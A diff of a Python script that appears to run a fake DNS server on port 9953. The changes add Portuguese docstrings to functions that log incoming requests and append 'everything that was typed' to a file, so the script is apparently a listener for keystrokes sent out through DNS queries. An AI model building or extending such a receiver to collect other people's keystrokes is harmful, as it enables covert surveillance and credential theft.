@@ -16,7 +16,6 @@ if len(sys.argv) > 1:
 else:
     _PORT = 9953
 
-
 _DNS_ADDR = ('0.0.0.0', _PORT)
 _FAKE_DOMAIN = '.example.com.'
 _LAST_REQUEST = []
@@ -32,6 +31,15 @@ _CONT = 0
 # Classes e Funções
 ###############################################################
 def treatments(data):
+    '''
+    Realiza o tratamento da string adicionando
+    a acentuação corretamente nas palavras
+    
+    Args:
+        data: str
+    Return:
+        data: str
+    '''
     replacements = {
         '´a': 'á',
         '´e': 'é',
@@ -57,9 +65,20 @@ def treatments(data):
 
     return data
 
-def write_on_file(path, arc_name, data):
-    
-    path_name = os.path.join(path, arc_name)
+def write_on_file(path, arq_name, data):
+    '''
+    Grava tudo o que foi digitado em um arquivo
+    no caminho especificado.
+
+    Args:
+        path:       str
+        arq_name:   str
+        data:       str
+
+    Return:
+        None
+    '''
+    path_name = os.path.join(path, arq_name)
 
     if os.path.isdir(path):
         with open(path_name, 'a') as file:
@@ -72,13 +91,23 @@ def write_on_file(path, arc_name, data):
             file.close()
 
 def menu(addr=None, data=None):
+    '''
+    Printa o Menu na tela.
+
+    Args:
+        addr: str
+        data: str
+
+    Return:
+        None
+    '''
     global _LAST_REQUEST, _PORT
 
     if len(_LAST_REQUEST) <= 10 and data != None:
-        _LAST_REQUEST.append(f'{addr} | {data}\n')
+        _LAST_REQUEST.append(f'  {addr} | {data}')
     elif len(_LAST_REQUEST) >= 10:
         _LAST_REQUEST.pop(0)
-        _LAST_REQUEST.append(f'{addr} | {data}\n')
+        _LAST_REQUEST.append(f'  {addr} | {data}')
 
     request_string = ''.join(i for i in _LAST_REQUEST)
 
